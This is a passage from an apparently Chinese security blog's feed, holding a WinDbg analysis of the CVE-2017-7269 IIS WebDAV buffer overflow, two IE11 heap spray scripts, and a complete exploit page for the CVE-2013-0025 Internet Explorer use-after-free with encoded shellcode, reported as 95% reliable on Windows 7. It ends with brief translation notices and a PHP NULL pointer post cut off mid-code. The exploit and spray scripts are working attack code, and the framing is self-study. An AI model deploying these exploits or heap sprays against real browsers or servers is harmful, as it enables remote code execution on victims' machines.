<p>单步执行下去，观察到ecx的值为0x4664就是我们拷贝的数据的大小，<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/4.png" alt="picture3"><br>然后按g命令执行到断点处，查看数据。观察到数据只有复制到0x02012fff。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/5.png" alt="picture4"><br>最后可以计算缓冲区的大小，远远小于0x4664这个值，所以造成了拷贝的缓冲区溢出。<br><img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/6.png" alt="picture5"><br>再进行细致的分析一下了，先看这个函数的伪代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">signed int __fastcall ScStoragePathFromUrl(int a1, wchar_t *a2, unsigned __int16 *a3, int a4, int a5)</div><div class="line">&#123;</div><div class="line">......  </div><div class="line">result = ScStripAndCheckHttpPrefix((const struct IEcb *)a1, (const unsigned __int16 **)&amp;Str);// 这里检查http前缀等信息</div><div class="line">  if ( result &lt; 0 )</div><div class="line">    return result;</div><div class="line">  if ( *Str != 47 )</div><div class="line">    return -2146107135;</div><div class="line">  v7 = _wcslen(Str); // 计算宽字节的长度</div><div class="line">  result=IEcbBase::ScReqMapUrlToPathEx((IEcbBase*)v5,Str,(struct_HSE_UNICODE_URL_MAPEX_INFO *)v40);// 这里将url该为本地路径格式</div><div class="line">  v36 = result;</div><div class="line">……</div><div class="line">else</div><div class="line">  &#123;</div><div class="line">    v21 = v35;</div><div class="line">    v22 = v16;</div><div class="line">    v23 = 2 * v16;</div><div class="line">    v24 = (unsigned int)(2 * v16) &gt;&gt; 2;</div><div class="line">    qmemcpy(v35, v40, 4 * v24);  //将本地字符串拷贝过去</div><div class="line">    v26 = &amp;v40[4 * v24];</div><div class="line">    v25 = &amp;v21[2 * v24];</div><div class="line">    LOBYTE(v24) = v23;</div><div class="line">    v27 = v42;</div><div class="line">    qmemcpy(v25, v26, v24 &amp; 3);</div><div class="line">    v28 = v7 - v27;</div><div class="line">    v29 = &amp;Str[v27];</div><div class="line">    v30 = v35;</div><div class="line">    qmemcpy(&amp;v35[v22], v29, 2 * v28 + 2); //这里拷贝剩下的字符串</div><div class="line">    for ( i = (int)&amp;v30[v41]; *(_WORD *)i; i += 2 )</div><div class="line">    &#123;</div><div class="line">      if ( *(_WORD *)i == 47 )</div><div class="line">        *(_WORD *)i = 92;</div><div class="line">    &#125;</div><div class="line">    *(_DWORD *)v34 = v37;</div><div class="line">    result = v36;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数调用了好几次，第一次调用的时候没有进入拷贝区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4d esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</div><div class="line">httpext!ScStoragePathFromUrl+0x2d2:</div><div class="line">673f6f4d 3901            cmp     dword ptr [ecx],eax  ds:0023:0130f800=00000082</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4f esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2d4:</div><div class="line">673f6f4f 8985b8fbffff    mov     dword ptr [ebp-448h],eax ss:0023:0130f350=01f058f0</div><div class="line">0:009&gt; dc ecx</div><div class="line">0130f800  00000082 00000000 00000000 00000000  ................</div><div class="line">0130f810  000001d5 0130fa40 7c95a656 01f00000  ....@.0.V..|....</div><div class="line">0130f820  0130f860 00000058 01f00660 01f00650  `.0.X...`...P...</div><div class="line">0130f830  0000012b 0130fa60 00000000 01f00000  +...`.0.........</div><div class="line">0130f840  00000000 00000001 00000016 01f00650  ............P...</div><div class="line">0130f850  00000000 000af064 01f0c2b8 00000000  ....d...........</div><div class="line">0130f860  8a885d04 0000006c 56b91e8c 56b91e82  .]..l......V...V</div><div class="line">0130f870  00000002 56b91e9a 0130fb34 00000033  .......V4.0.3...</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f55 esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2da:</div><div class="line">673f6f55 7342            jae     httpext!ScStoragePathFromUrl+0x31e (673f6f99) [br=0]</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f57 esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2dc:</div><div class="line">673f6f57 8901            mov     dword ptr [ecx],eax  ds:0023:0130f800=00000082</div></pre></td></tr></table></figure>
<p>看到上面调试信息没有跳转。第二次或者第三次的时候跳转过去进行拷贝了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4d esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</div><div class="line">httpext!ScStoragePathFromUrl+0x2d2:</div><div class="line">673f6f4d 3901            cmp     dword ptr [ecx],eax  ds:0023:0130f800=00002344</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4f esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x2d4:</div><div class="line">673f6f4f 8985b8fbffff    mov     dword ptr [ebp-448h],eax ss:0023:0130f350=01f058f0</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f55 esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x2da:</div><div class="line">673f6f55 7342            jae     httpext!ScStoragePathFromUrl+0x31e (673f6f99) [br=1]</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f99 esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x31e:</div><div class="line">673f6f99 8bbdb0fbffff    mov     edi,dword ptr [ebp-450h] ss:0023:0130f348=0208f810</div><div class="line">0:009&gt; p</div><div class="line">eax=00000024 ebx=00002331 ecx=00000000 edx=00000000 esi=0130f380 edi=0208f834</div><div class="line">eip=673f6fbc esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x341:</div><div class="line">673f6fbc f3a4            rep movs byte ptr es:[edi],byte ptr [esi]</div><div class="line">0:009&gt; dc edi</div><div class="line">01fcf834  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf844  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf854  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf864  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf874  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf884  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf894  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf8a4  00000000 00000000 00000000 00000000  ................</div><div class="line">0:009&gt; dc esi</div><div class="line">0130f35c  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.</div><div class="line">0130f36c  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.</div><div class="line">0130f37c  0074006f 0061005c 00610061 00610061  o.t.\.a.a.a.a.a.</div><div class="line">0130f38c  00610061 00410041 00410041 00410041  a.a.A.A.A.A.A.A.</div><div class="line">0130f39c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3ac  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3bc  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3cc  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0:009&gt; p</div><div class="line">eax=00000024 ebx=00002331 ecx=00000000 edx=00000000 esi=0130f380 edi=0208f834</div><div class="line">eip=673f6fbe esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x343:</div><div class="line">673f6fbe 8bb5bcfbffff    mov     esi,dword ptr [ebp-444h] ss:0023:0130f354=020823d8</div><div class="line">0:009&gt; dc esi    </div><div class="line">0130f380  0061005c 00610061 00610061 00610061  \.a.a.a.a.a.a.a.</div><div class="line">0130f390  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3a0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3b0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3c0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3d0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3e0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0:009&gt; dc edi-0x24   //这里将本地路径拷贝过去了。</div><div class="line">01fcf810  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.</div><div class="line">01fcf820  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.</div><div class="line">01fcf830  0074006f 00000000 00000000 00000000  o.t.............</div><div class="line">01fcf840  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf850  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf860  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf870  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf880  00000000 00000000 00000000 00000000  ................</div></pre></td></tr></table></figure></p>
<p>后面的拷贝就是开头那一次所讲的。这个漏洞是我第一次自己分析，有些地方还不是很明白，相信以后知识深了，就能够 更深入了。还有一开始没注意GS机制，一直想覆盖ret地址，最后才发现问题。这个漏洞我觉得k0大牛分析的挺详细，挺深入的，可以网上搜下。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HeapLib2 Heap Spray脚本]]></title>
      <url>http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>IE 11下Heaplib2方法喷射正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;heapLib2.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h1 id=&quot;wonk&quot; data-wonk=&quot;wonky&quot;&gt;honk&lt;/h1&gt;</div><div class="line"></div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">    var obj = document.getElementById(&quot;wonk&quot;);</div><div class="line">            </div><div class="line">    //Create a heapLib2 object for Internet Explorer    </div><div class="line">    var heap = new heapLib2.ie(obj, 0x80000); </div><div class="line">     var code = unescape(&quot;%ucccc&quot;);</div><div class="line">     while(code.length&lt;400) code += code;</div><div class="line">    code  = code.substring(0,400);</div><div class="line"> var rop = unescape(&quot;%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747%u4848%u4848&quot;);</div><div class="line"> var pad = unescape(&quot;%u9090%u9090&quot;);</div><div class="line"> while (pad.length &lt; 0x1000) pad += pad;</div><div class="line"></div><div class="line"> offset_length = 0x5E6;</div><div class="line"> junk_offset = pad.substring(0, offset_length);</div><div class="line"></div><div class="line"> var shellcode = junk_offset + rop + code + pad.substring(0, 0x800 - code.length - junk_offset.length - rop.length);</div><div class="line"> while (shellcode.length &lt; 0x40000) shellcode += shellcode;</div><div class="line"> var block = shellcode.substring(2, 0x40000 - 0x21);</div><div class="line">    for (var i = 0; i &lt; 0x500; i++)&#123;</div><div class="line">            //this will bypass the cache allocator</div><div class="line">            heap.sprayalloc(&quot;big_attr&quot;+i, block); </div><div class="line">    &#125;</div><div class="line">    heap.free(&quot;big_attr0&quot;);</div><div class="line">    alert(&quot;HeapLib2 done&quot;);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[IE 11 Heap Spray脚本]]></title>
      <url>http://yoursite.com/2017/03/20/IE-11-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>由于网上找不到IE最新版本的堆喷射脚本，自己查找资料找到，稍微改了下，win7 sp1 IE 11 亲测可用。</p>
<p>html5堆喷射脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge;chrome=1&quot;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">  var memory=Array();</div><div class="line">  function fill(imgd,payload)&#123;</div><div class="line">     for(var i=0;i&lt;=imgd.data.length;i++)&#123;</div><div class="line">	    imgd.data[i]=payload[i%payload.length];</div><div class="line">	 </div><div class="line">	 &#125;;</div><div class="line">  </div><div class="line">  &#125;;</div><div class="line">  </div><div class="line">  window.onload=function()&#123;</div><div class="line">      var payload=[0x0c,0x0c,0x0c,0x0c];</div><div class="line">	  for(var i=0;i&lt;500;i++)&#123;</div><div class="line">	    var elem=document.createElement(&apos;canvas&apos;);</div><div class="line">		elem.width=256;</div><div class="line">		elem.height=256;</div><div class="line">		var context=elem.getContext(&apos;2d&apos;);</div><div class="line">		var imgd=context.createImageData(256,256);</div><div class="line">		fill(imgd,payload);</div><div class="line">		memory[i]=imgd;</div><div class="line">	  &#125;</div><div class="line">	  &#125;</div><div class="line">	  alert(&apos;Spray Done&apos;);</div><div class="line">  &lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2013-0025 IE UAF漏洞]]></title>
      <url>http://yoursite.com/2017/03/10/CVE-2013-0025-IE-UAF%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> 首先说明一点，我在浏览器溢出方面的知识挺浅薄的，这次的漏洞分析网上也早就有了，我就不分析了，漏洞根本原因，我也不是很清楚，然后漏洞利用我也只是根据别人的技术文章改的。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>POC这种东西我就不放了，下面的参考链接都有。<br>直接放exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">  function alloc(bytes,mystr)&#123;</div><div class="line">  	while(mystr.length&lt;bytes) mystr+=mystr;</div><div class="line">  	return mystr.substr(0,(bytes-6)/2);</div><div class="line">  &#125;</div><div class="line">  block_size=0x1000;</div><div class="line">  padding_size=0x666/2;</div><div class="line">  Padding=&apos;&apos;;</div><div class="line">  NopSlide=&apos;&apos;;</div><div class="line">  var Shellcode=unescape(&apos;%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u2058%u6820%u6568%u6c6c%udb31%u5c88%u0524%ue389%u6868%u5821%u6820%u6b63%u7a79%u7968%u6820%u6861%u6465%u6220%u6868%u6361%u316b%u88c9%u244c%u8912%u31e1%u52d2%u5153%uff52%u31d0%u50c0%u55ff%u4108&apos;);</div><div class="line">  for(p=0;p&lt;padding_size;p++)&#123;</div><div class="line">  	Padding+=unescape(&apos;%u0cf0%u0c0c&apos;);</div><div class="line">  &#125;</div><div class="line">  for(c=0;c&lt;block_size;c++)&#123;</div><div class="line">  	NopSlide+=unescape(&apos;%u9090&apos;);</div><div class="line">  &#125;</div><div class="line">  NopSlide=NopSlide.substring(0,block_size-(Shellcode.length+Padding.length));</div><div class="line">  var OBJECT=Padding+Shellcode+NopSlide;</div><div class="line">  OBJECT=alloc(0xfffe0,OBJECT);</div><div class="line">  var evil=new Array();</div><div class="line">  for(var k=0;k&lt;150;k++)&#123;</div><div class="line">  	evil[k]=OBJECT.substr(0,OBJECT.length);</div><div class="line">  &#125;</div><div class="line"></div><div class="line"> var data;</div><div class="line"> var objArray=new Array(1150);</div><div class="line"> setTimeout(function()&#123;</div><div class="line"> document.body.style.whiteSpace=&quot;pre-line&quot;;</div><div class="line"> for(var i=0;i&lt;1150;i++)&#123;</div><div class="line">  objArray[i]=document.createElement(&apos;div&apos;);</div><div class="line">  objArray[i].className=data+=unescape(&quot;%u0c0c%u0c0c&quot;);</div><div class="line">  &#125; //这里占据释放的部分</div><div class="line">  setTimeout(function()&#123;document.body.innerHTML=&quot;boo&quot;&#125;,100)&#125;,100)</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;p&gt; &lt;/p&gt;  //这里的空格很必要</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>这个漏洞我在win7和xp下实验了下，xp下不是很稳定，win7的成功率95%,根据那篇文章的喷射我到最后的时候进行函数调用的位置变成0x0c0c0c7c，这里正好处在shellcode下面部分了，所以我将它改成了更高的位置，这样的成功率变大了。</p>
<p><img src="https://raw.githubusercontent.com/whiteHat001/AllPicture/master/exploit.png" alt="avatar"></p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>终于在win7下利用成功了，不过没能用rop绕过dep，不知道为啥执行不了，看来还是需要多学习学习。最近发现特别热爱学习了。每时每刻都想学习到技术。</p>
<p>参考链接<br><a href="http://www.2cto.com/article/201303/196178.html" target="_blank" rel="external">http://www.2cto.com/article/201303/196178.html</a><br><a href="http://bobao.360.cn/learning/detail/3555.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3555.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HTML5沙盒绕过(翻译)]]></title>
      <url>http://yoursite.com/2017/03/07/HTML5%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>可以移步到看雪论坛观赏，地址 <a href="http://bbs.pediy.com/thread-216185.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216185.htm</a><br>有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[汽车黑客手册(翻译)by hackyzh]]></title>
      <url>http://yoursite.com/2017/03/05/%E6%B1%BD%E8%BD%A6%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>由于markdown不太好排版，所以只好放在word文档里面，翻译这些文章，只是兴趣使然，没有别的意思。由于英文水平有限，麻烦看到错误请指出谢谢！后面可能会继续翻译下去。</p>
<p>第一章地址：<a href="https://github.com/whiteHat001/Car-Hacker-s-Handbook--" target="_blank" rel="external">https://github.com/whiteHat001/Car-Hacker-s-Handbook--</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[NULL Pointer Dereference]]></title>
      <url>http://yoursite.com/2017/02/19/NULL-Pointer-Dereference/</url>
      <content type="html"><![CDATA[<h1 id="NULL-pointer-dereference-php漏洞挖掘系列四"><a href="#NULL-pointer-dereference-php漏洞挖掘系列四" class="headerlink" title="NULL pointer dereference (php漏洞挖掘系列四)"></a>NULL pointer dereference (php漏洞挖掘系列四)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本次要讲的是空指针漏洞，php官方把空指针漏洞算安全漏洞，有些空指针漏洞会申报cve的，不过我也不太清楚它将哪些空指针漏洞上报cve，好了开始分享本次漏洞吧，这个漏洞案例有些地方我也不是很清楚，那个上报漏洞人有些地方讲解的地方不是很清楚，我自己水平有限，欢迎清楚的朋友指点指点。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放顶层函数代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">static ZIPARCHIVE_METHOD(extractTo)</div><div class="line">&#123;</div><div class="line">	struct zip *intern;</div><div class="line"></div><div class="line">	zval *self = getThis();</div><div class="line">	zval *zval_files = NULL;</div><div class="line">	zval *zval_file = NULL;</div><div class="line">	php_stream_statbuf 